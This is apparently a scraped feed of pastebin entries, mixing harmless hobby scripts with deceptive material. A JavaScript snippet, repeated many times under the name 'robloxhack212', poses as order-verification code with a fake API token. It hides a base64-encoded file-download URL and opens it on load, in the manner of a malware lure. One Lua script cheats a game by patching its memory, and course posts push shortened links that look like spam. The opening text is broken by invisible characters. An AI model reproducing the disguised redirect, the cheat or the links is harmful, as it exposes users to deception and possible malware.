‎c‎e‎n‎t‎i‎m‎e‎t‎r‎e‎s‎ ‎(‎1‎2‎ ‎t‎o‎ ‎3‎6‎ ‎i‎n‎c‎h‎e‎s‎)‎ ‎t‎a‎l‎l‎.‎ ‎T‎h‎e‎ ‎s‎t‎e‎m‎s‎ ‎r‎i‎s‎e‎ ‎a‎b‎o‎v‎e‎ ‎t‎h‎e‎ ‎f‎o‎l‎i‎a‎g‎e‎ ‎a‎n‎d‎ ‎b‎r‎a‎n‎c‎h‎ ‎n‎e‎a‎r‎ ‎t‎h‎e‎ ‎t‎o‎p‎ ‎o‎f‎ ‎t‎h‎e‎ ‎s‎t‎e‎m‎,‎ ‎t‎h‎e‎ ‎s‎t‎e‎m‎s‎ ‎h‎a‎v‎i‎n‎g‎ ‎b‎a‎r‎b‎e‎d‎ ‎h‎a‎i‎r‎s‎ ‎w‎h‎i‎c‎h‎ ‎p‎o‎i‎n‎t‎ ‎d‎o‎w‎n‎w‎a‎r‎d‎ ‎a‎n‎d‎ ‎m‎a‎k‎e‎ ‎t‎h‎e‎ ‎p‎l‎a‎n‎t‎ ‎r‎o‎u‎g‎h‎ ‎t‎o‎ ‎t‎h‎e‎ ‎t‎o‎u‎c‎h‎.‎ ‎T‎h‎e‎ ‎m‎i‎d‎d‎l‎e‎ ‎a‎n‎d‎ ‎u‎p‎p‎e‎r‎ ‎l‎e‎a‎v‎e‎s‎ ‎a‎r‎e‎ ‎l‎i‎n‎e‎a‎r‎-‎l‎a‎n‎c‎e‎o‎l‎a‎t‎e‎ ‎w‎i‎t‎h‎ ‎p‎o‎i‎n‎t‎e‎d‎ ‎a‎p‎e‎x‎e‎s‎.‎ ‎B‎u‎t‎t‎e‎r‎f‎l‎i‎e‎s‎ ‎a‎n‎d‎ ‎l‎o‎n‎g‎-‎t‎o‎n‎g‎u‎e‎d‎ ‎b‎e‎e‎s‎ ‎f‎e‎e‎d‎ ‎o‎n‎ ‎t‎h‎e‎ ‎f‎l‎o‎w‎e‎r‎s‎'‎ ‎n‎e‎c‎t‎a‎r‎.‎ ‎I‎n‎ ‎a‎d‎d‎i‎t‎i‎o‎n‎ ‎t‎o‎ ‎t‎h‎e‎s‎e‎ ‎p‎o‎l‎l‎i‎n‎a‎t‎o‎r‎s‎,‎ ‎t‎h‎e‎ ‎f‎l‎o‎w‎e‎r‎s‎ ‎a‎r‎e‎ ‎v‎i‎s‎i‎t‎e‎d‎ ‎b‎y‎ ‎m‎a‎n‎y‎ ‎o‎t‎h‎e‎r‎ ‎t‎y‎p‎e‎s‎ ‎o‎f‎ ‎i‎n‎s‎e‎c‎t‎s‎,‎ ‎a‎n‎d‎ ‎c‎a‎n‎ ‎b‎e‎ ‎c‎h‎a‎r‎a‎c‎t‎e‎r‎i‎z‎e‎d‎ ‎b‎y‎ ‎a‎ ‎g‎e‎n‎e‎r‎a‎l‎i‎z‎e‎d‎ ‎p‎o‎l‎l‎i‎n‎a‎t‎i‎o‎n‎ ‎s‎y‎n‎d‎r‎o‎m‎e‎.‎ ‎T‎h‎i‎s‎ ‎S‎.‎ ‎f‎l‎o‎s‎-‎c‎u‎c‎u‎l‎i‎ ‎f‎l‎o‎w‎e‎r‎ ‎w‎a‎s‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎e‎d‎ ‎i‎n‎ ‎N‎i‎i‎t‎v‎ä‎l‎j‎a‎,‎ ‎E‎s‎t‎o‎n‎i‎a‎.‎ ‎T‎h‎i‎s‎ ‎p‎i‎c‎t‎u‎r‎e‎ ‎w‎a‎s‎ ‎f‎o‎c‎u‎s‎-‎s‎t‎a‎c‎k‎e‎d‎ ‎f‎r‎o‎m‎ ‎2‎7‎ ‎s‎e‎p‎a‎r‎a‎t‎e‎ ‎i‎m‎a‎g‎e‎s‎.‎

P‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎I‎v‎a‎r‎ ‎L‎e‎i‎d‎u‎s‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

B‎y‎e‎,‎ ‎g‎u‎y‎s‎.‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎g‎o‎ ‎l‎i‎s‎t‎e‎n‎ ‎t‎o‎ ‎s‎o‎m‎e‎ ‎c‎o‎s‎m‎i‎c‎ ‎b‎a‎c‎k‎g‎r‎o‎u‎n‎d‎ ‎r‎a‎d‎i‎a‎t‎i‎o‎n‎.‎"
bqhPRGW6,Untitled,Muu2736,Lua,Saturday 29th of March 2025 06:19:50 PM CDT,"-- Script generated by GameGuardian 101.1
-- Lua help: http://gameguardian.net/help/

local scriptName = [=====[👑  PRO ปั้ม BY เซียน    ➡️  30 มีนาคม 2025]=====]
local scriptVersion = '1.0.0'
local scriptAuthor = 'User'

-- วันหมดอายุ
local expirationDate = os.time({year=2025, month=3, day=30}) -- วันที่หมดอายุ: 30 มีนาคม 2025
local currentDate = os.time()

-- เช็ควันหมดอายุ
if currentDate > expirationDate then
    gg.alert(""🙏วันใช้งานหมด🙏 กรุณาติดต่อ🧑‍✈️ FB เซียน ประวีน"")
    os.exit()
end

-- init
gg.require('101.1', 16142)
gg.toast(scriptName..' v'..scriptVersion..' by '..scriptAuthor)

-- Function to perform the main action
function mainAction()
    gg.clearResults()
    gg.searchNumber(""h0100000012CA9A3BFF"", gg.TYPE_BYTE, false, gg.SIGN_EQUAL, 0, -1, 0)

    local results = gg.getResults(100)
    for i, v in ipairs(results) do
        if v.flags == gg.TYPE_BYTE then
            v.value = ""h3300000012CA9A3BFF""
            v.freeze = true
        end
    end
    gg.addListItems(results)
    gg.processResume()
    gg.toast(""👑 RUN ออโต้กันแบน BY เซียน"")
end

-- Menu function (ไม่ต้องวนลูป)
local options = {
    ""💵   เด้งแพค ปั้มยุทธ์ BY เซียน"",
  ""🚪    Exit""
}

local choice = gg.choice(options, nil, scriptName)
if choice == 1 then
    mainAction()
elseif choice == 2 then
    gg.alert(""📣 🙏🙏 ขอบคุณที่ใช้ บริการครับ 🙏🙏 "")
end"
3x3hrY2k,Untitled,Epiphemeral,JavaScript,Saturday 29th of March 2025 06:19:09 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/196/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
m2TUDUpd,Installer,AdditionalPylons,Lua,Saturday 29th of March 2025 06:15:51 PM CDT,"print(""Where would you like to install LIMAPI? (relative to current dir)"")
local dest = shell.resolve(read())
shell.run(""pastebin get eREGwRGT ""..dest..""/ui_limapi.lua"")
shell.run(""pastebin get M9uq3brA ""..dest..""/limapi.lua"")"
xsb55Ehn,Products.js,robloxhack212,JavaScript,Saturday 29th of March 2025 06:03:41 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/550/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
eREGwRGT,limapi_ui,AdditionalPylons,Lua,Saturday 29th of March 2025 05:57:55 PM CDT,"local MAIN_CHEST = ""minecraft:chest_0""
local CURR_DIR = fs.getDir(shell.getRunningProgram())
local RECENTS_FILE = CURR_DIR..""/caches/recent_items.lua""
local AMOUNTS_FILE = CURR_DIR..""/caches/amounts.txt""
local CACHE_FILE = CURR_DIR..""/caches/cache.lua""

local inv = require(""limapi"")
local completion = require(""cc.completion"")
inv.registerChests()
inv.setMainChest(MAIN_CHEST)

local w,h = term.getSize()

inv.loadCache(CACHE_FILE)
local recently_pulled = {}
local amounts_cache = {}
local function getRecents(file)
    local recents_file = fs.open(file,""r"")
	if recents_file == nil then return end
    recently_pulled = textutils.unserialise(recents_file.readAll())
    recents_file.close()
end
local function saveRecents(file)
    local recents_file = fs.open(file,""w"")
    recents_file.write(textutils.serialise(recently_pulled))
    recents_file.close()
end
local function getAmounts(file)
    amounts_cache = {}
    local amounts_file = fs.open(file, ""r"")
    if amounts_file == nil then return end
    local l = 0
    while true do
        local line = amounts_file.readLine()
        if not line then break end
        l = l + 1
        amounts_cache[l] = line
    end
    amounts_file.close()
end
local function saveAmounts(file)
    local amounts_file = fs.open(file,""w"")
    for i=1,#amounts_cache do
        amounts_file.write(amounts_cache[i]..""\n"")
    end
    amounts_file.close()
end
local function updateRecents(item)
    print(textutils.serialise(recently_pulled))
    local found = false
    for i=1,#recently_pulled do
        if item == recently_pulled[i] then
            found = true
            for j=i-1,1,-1 do
                recently_pulled[j+1]=recently_pulled[j]
            end
            break
        end
    end
    if not found then
        for i=#recently_pulled,1,-1 do
            recently_pulled[i+1]=recently_pulled[i]
        end
    end
    recently_pulled[1] = item
    recently_pulled[40] = nil
    saveRecents(RECENTS_FILE)
end
getRecents(RECENTS_FILE)
getAmounts(AMOUNTS_FILE)

local function uiPullItem()
    print(""Item ID:"")
    local name = read()
    write(""Amount: (default: 1) "")
    local am = tonumber(read()) or 1
    
    if not string.find(name, "":"", 1, true) then
        name = ""minecraft:""..name
    end
    inv.pullItem(name,am)
    updateRecents(name)
end
local function uiRecentItem()
    local scroll=0
    local name
    term.setBackgroundColour(colours.black)
    while true do
        term.setCursorPos(1,1)
        term.clear()
        for i=1+scroll,scroll+h-1 do
            if recently_pulled[i]==nil then break end
            print(""\x07 ""..recently_pulled[i])
        end
        term.setCursorPos(w,1)
        write(""x"")
        local ev = {os.pullEvent()}
        if ev[1]==""mouse_scroll"" then
            scroll=scroll+ev[2]
            if scroll<0 then scroll=0 end
        elseif ev[1]==""mouse_click"" or ev[1]==""monitor_touch"" then
            if ev[3]==w and ev[4]==1 then
                return
            end
            if ev[3]==1 then
                table.remove(recently_pulled,ev[4]+scroll)
            else
                name = recently_pulled[ev[4]+scroll]
                if name~=nil then
                    term.setBackgroundColour(colours.blue)
                    paintutils.drawFilledBox(1,1,w,ev[4]-1)
                    paintutils.drawFilledBox(1,ev[4]+1,w,h)
                    term.setCursorPos(1,ev[4]+1)
                    break
                end
            end
        end
    end
    write(""Amount: (default: 1) "")
    local am = tonumber(read()) or 1
    inv.pullItem(name,am)
    updateRecents(name)
end
local function convertAmountsTable()
    amounts_cache = {""Last updated at ""..os.date('%Y-%m-%d %H:%M:%S')}
    local n = 1
    for item,count in pairs(inv.listItemsWithCount()) do
        n = n+1
        amounts_cache[n] = count.."" x ""..item
    end
end
local function uiListAll()
    local scroll=0
    local name
    term.setBackgroundColour(colours.black)
    while true do
        term.setCursorPos(1,1)
        term.clear()
        for i=1+scroll,scroll+h-1 do
            if amounts_cache[i]==nil then break end
            print(amounts_cache[i])
        end
        term.setCursorPos(w-2,1)
        write(""@ x"")
        local ev = {os.pullEvent()}
        if ev[1]==""mouse_scroll"" then
            scroll=scroll+ev[2]
            if scroll<0 then scroll=0 end
        elseif ev[1]==""mouse_click"" or ev[1]==""monitor_touch"" then
            if ev[3]==w and ev[4]==1 then
                return
            end
            if ev[3]==w-2 and ev[4]==1 then
                term.setCursorPos(1,h)
                print(""Recaching all stored values, this may take a while..."")
                convertAmountsTable()
                saveAmounts(AMOUNTS_FILE)
            elseif ev[4]+scroll~=1 and ev[4]~=h then
                name = amounts_cache[ev[4]+scroll]
                if name~=nil then
                    name = name:match(""%d+ x (.+)"")
                    term.setBackgroundColour(colours.blue)
                    paintutils.drawFilledBox(1,1,w,ev[4]-1)
                    paintutils.drawFilledBox(1,ev[4]+1,w,h)
                    term.setCursorPos(1,ev[4]+1)
                    break
                end
            end
        end
    end
    write(""Amount: (default: 1) "")
    local am = tonumber(read()) or 1
    inv.pullItem(name,am)
    updateRecents(name)
end
local function uiSearch()
    local items = inv.listItems()
    print(""Search an item"")
    local name = read(nil,nil,function(p) return completion.choice(p,items) end, ""minecraft:"")
    write(""\nAmount: (default: 1) "")
    local am = tonumber(read()) or 1
    inv.pullItem(name,am)
    updateRecents(name)
end
local function uiHelp()
    term.setBackgroundColour(colours.black)
    term.clear()
    term.setCursorPos(1,1)
   	print(""Register new chests - add new chests to the system."")
    print(""Pull an item - pull item by id. \""minecraft:\"" is automatically added."")
    print(""Pull a recent item - show a list of your recent lookups. Tip: press the \x07 to remove entry."")
    print(""See the full list - see all the items in the system with their amounts. Since it's a costly operation, you must refresh it manually by pressing @."")
    print(""Search - same as \""pull an item\"", except with autocompletion."")
    print(""Return all items - all the items in the main chest are pushed into the system."")
    print(""Restock - all the items in the main chest are filled to the full stack."")
    print(""Refresh cache - debug action, use when manually tampering with the system."")
	write(""To select the main chest, edit the first line of this file. DO NOT PLACE IT ADJACENTLY TO THE COMPUTER."")
    sleep(1)
    os.pullEvent()    
end
local shutdown = false
local buttons = {
    {""Register new chests"", inv.registerChests},
    {""Pull an item"", uiPullItem},
    {""Pull a recent item"", uiRecentItem},
    {""See the full list"", uiListAll},
    {""Search"",uiSearch},
    {""Return all items"", inv.returnItems},
    {""Restock"",inv.restockMainChest},
    {""Refresh cache (debug)"", inv.createCache},
    {""Help"",uiHelp},
    {""Exit"", function() shutdown = true end}
}
while true do
    if shutdown then break end
    term.setBackgroundColour(colours.grey)
    term.clear()
    term.setBackgroundColour(colours.blue)
    term.setCursorPos(1,1)
    for i=1,#buttons do
        print(""\x07 ""..buttons[i][1])
    end
    local ev = {os.pullEvent()}
    if ev[1]==""monitor_touch"" or ev[1]==""mouse_click"" then
        local c = buttons[ev[4]]
        if c~=nil then
            c[2]()
            term.setCursorPos(w,h)
        end
    end
end
term.setBackgroundColour(colours.black)
term.clear()
term.setCursorPos(1,1)
inv.saveCache(CACHE_FILE)"
Rm4QDjVS,Java/Eclipse & Object-Oriented Programming,f0f077,Java,Saturday 29th of March 2025 05:41:32 PM CDT,"Java/Eclipse & Object-Oriented Programming
Java Essentials for those who want to learn the essentials of Java in a short time
What you will learn
Object-Oriented Programming (OOP)
The classes
The objects
The methods
The attributes
The legacy (extends)
for more:https://cuty.io/yLYndQUW28"
2PB6khpj,Become a Java developer,f0f077,Java,Saturday 29th of March 2025 05:39:08 PM CDT,"Become a Java developer
Learn the Java language easily, 45 corrected exercises included
What you will learn
Create a Java application step by step throughout the course!
Master the fundamentals of object-oriented programming from Java 8
Install and use the Java Virtual Machine
Use language fundamentals such as operators, variables or control structures
Implement object-specific concepts such as inheritance, interfacing, or polymorphism
Use concepts from the latest versions such as iterative foreach structures, ellipses, auto-boxing/unboxing or enumerated types
for more:https://cuty.io/jZhlrJGBf"
PwwFdBEZ,Market.js,robloxhack212,JavaScript,Saturday 29th of March 2025 05:32:57 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/691/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
pPHTsuG3,Products.js,robloxhack212,JavaScript,Saturday 29th of March 2025 05:02:11 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/625/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
wsZ2Srwv,PYTHON 2025 Certification | 8 PRACTICAL WORKSHOPS + 20 Hours,f0f077,Python,Saturday 29th of March 2025 04:50:31 PM CDT,"PYTHON 2025 Certification | 8 PRACTICAL WORKSHOPS + 20 Hours
Learn to Program in Python: Developing in Python Has Never Been Easier! 2025 Edition
What you will learn
Learn the basics of language as well as advanced concepts
Saving information in databases
Automates repetitive tasks
Create functions to automate tasks
Creates desktop programs with graphical interfaces
Create your own modules
for more:https://cuty.io/DGZT"
yj0aNZ31,flux-compressor.lua,ccraftersanonmoose,Lua,Saturday 29th of March 2025 04:47:36 PM CDT,"-- Script to stop the flux compressor from exploading
-- planning to control this behavior via redstone integrator
-- should turn off compressor when it reaches critical
-- should also turn the compressor back on when pressure reaches 11 bar
-- compressor is being used in this case to power a spawner


----------

local flux = peripheral.wrap(""pneumaticcraft:flux_compressor_0"")
local relay = peripheral.wrap(""redstoneIntegrator_0"")

-- monitor pressure & shut off when critical
local function fluxcontrol()
    if flux.getPressure() >= 20 then
        relay.setOutput(""right"", false)
    elseif flux.getPressure() <= 11 then
        relay.setOutput(""right"", true)

    end
end


while true do
    fluxcontrol()
end"
pmjt3gPu,NewTimer,doodleloos,Lua,Saturday 29th of March 2025 04:46:12 PM CDT,"--clear screen and display info

local monitor = peripheral.find(""monitor"")
monitor.setTextScale(.5)

term.clear()
monitor.clear()

term.setCursorPos(1,1)
monitor.setCursorPos(1,1)

term.write(""-Timer Program-"")
monitor.write(""-Timer Program-"")

term.setCursorPos(1,3)
monitor.setCursorPos(1,3)

term.write (""Cycles: "")
monitor.write (""Cycles: "")

ITR = io.read()

term.setCursorPos(1,3)
monitor.setCursorPos(1,3)

term.write (""Cycles: ""..ITR)
monitor.write (""Cycles: ""..ITR)

term.setCursorPos(1,4)
monitor.setCursorPos(1,4)

term.write (""Delay: "")
monitor.write (""Delay: "")

SEC = io.read()

term.setCursorPos(1,4)
monitor.setCursorPos(1,4)

term.write (""Delay: ""..SEC)
monitor.write (""Delay: ""..SEC)

term.setCursorPos(1,6)
monitor.setCursorPos(1,6)

term.write (""-Running"")
monitor.write (""-Running"")

if ITR ~= 0 then 
    for i = 1,ITR do 
        function MAIN()
    end
end
if ITR == 0 then
    while true do
        function MAIN()
	end
end




term.setCursorPos(1,10)
monitor.setCursorPos(1,10)
term.write (""-Complete-"")
monitor.write (""-Complete-"")



function MAIN()

	term.setCursorPos(1,7)
	monitor.setCursorPos(1,7)	
	
	term.write (""               "")
	monitor.write (""               "")	
	
	term.setCursorPos(1,7)
	monitor.setCursorPos(1,7)	
	
	term.write (""Cycle ""..i)
	monitor.write (""Cycle ""..i)	

	rs.setOutput(""front"", true)
	sleep(.25)
	rs.setOutput(""front"", false)
	rs.setOutput(""left"", true)
	sleep(.25)
	rs.setOutput(""left"", false)
	rs.setOutput(""back"", true)
	sleep(.25)
	rs.setOutput(""back"", false)
	rs.setOutput(""right"", true)
	sleep(.25)
	rs.setOutput(""right"", false)
	
	for x = SEC,1,-1 do 
		term.setCursorPos(1,8)
		monitor.setCursorPos(1,8)
		
		term.write (""               "")
		monitor.write (""               "")
		
		term.setCursorPos(1,8)
		monitor.setCursorPos(1,8)
		
		term.write (""Seconds ""..x)
		monitor.write (""Seconds ""..x)
		
		sleep(1)
	end

end


"
ZnNKC6qY,101 Corrected Python Exercises and Algorithms,f0f077,Python,Saturday 29th of March 2025 04:45:41 PM CDT,"101 Corrected Python Exercises and Algorithms
Improve your skills on dozens of algorithmic concepts with these 101 practical Python exercises.
What you will learn
Develop a problem-solving mindset
Learn little-known functions and techniques
Discover ways to optimize your code
Understanding how an algorithm works
for more:https://cuty.io/tl4NzXRMt"
pM8MDr3x,quickedit_termux,orborbson,Bash,Saturday 29th of March 2025 04:42:39 PM CDT,"#!/data/data/com.termux/files/usr/bin/sh

if [ -z ""${1}"" ]; then echo ""[BŁĄD]: podaj nazwę pliku""; exit 1; fi
FILE=""`realpath -q ${1}`""
if [ ! -f ""${FILE}"" ]; then touch ""${FILE}""; IS_NEW=""true""; fi

APK=""com.rhmsoft.edit""

STAT_A=`stat -c %Y ""${FILE}""`
if am start -n ""${APK}/${APK}.activity.MainActivity"" -d ""file://${FILE}"" > /dev/null 2>&1; then 
	sudo sh -c ""while pidof -s -q ${APK}; do sleep 2; done"" 
else
	echo ""[BŁĄD]: nie można uruchomić \""${APK}\""""
fi
STAT_B=`stat -c %Y ""${FILE}""`

if [ -n ""${IS_NEW}"" ] && [ ""${STAT_A}"" -eq ""${STAT_B}"" ]; then rm -f ""${FILE}""; fi
"
LXmFPJXH,Market.js,robloxhack212,JavaScript,Saturday 29th of March 2025 04:31:03 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/015/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
hyQiTemB,Untitled,robloxhack212,JavaScript,Saturday 29th of March 2025 04:15:30 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/457/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
N0rnrxr6,Products.js,robloxhack212,JavaScript,Saturday 29th of March 2025 04:00:07 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/735/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
FM06gKs1,SQL for Beginners: Learn SQL using MySQL and Database Design,f0f077,SQL,Saturday 29th of March 2025 03:53:23 PM CDT,"SQL for Beginners: Learn SQL using MySQL and Database Design
Understand SQL using the MySQL database. Learn Database Design and Data Analysis with Normalization and Relationships
What you'll learn
Have a detailed knowledge and understanding of using MySQL, one of the most widely used databases in the world.
Obtained a knowledge of SQL, and MySQL, allows students to apply for jobs in the IT sector.
for more :https://cuty.io/ptBql6n
"
7mBqwb2h,Order.js,robloxhack212,JavaScript,Saturday 29th of March 2025 03:44:21 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/894/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
bc8UYU6d,Rank teams by votes,Nonplussed,Python,Saturday 29th of March 2025 03:42:09 PM CDT,"from functools import cmp_to_key

class Solution:
    def rankTeams(self, allVoteEntries: List[str]) -> str:
        allTeamNames = allVoteEntries[0]
        numTeams = len(allTeamNames)

        rankings = {teamName: [0]*numTeams for teamName in allTeamNames}
        for voteEntry in allVoteEntries:
            for ith_rank, teamName in enumerate(voteEntry):
                rankings[teamName][ith_rank] += 1

        def compare(teamName1, teamName2):
            for ith_rank in range(numTeams):
                if rankings[teamName1][ith_rank] > rankings[teamName2][ith_rank]:
                    return -1
                elif rankings[teamName2][ith_rank] > rankings[teamName1][ith_rank]:
                    return 1
            
            if ord(teamName1) < ord(teamName2):
                return -1
            else:
                return 1

        return """".join(sorted(allTeamNames, key = cmp_to_key(compare)))"
g7B97WJt,Untitled,robloxhack212,JavaScript,Saturday 29th of March 2025 03:13:33 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/339/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
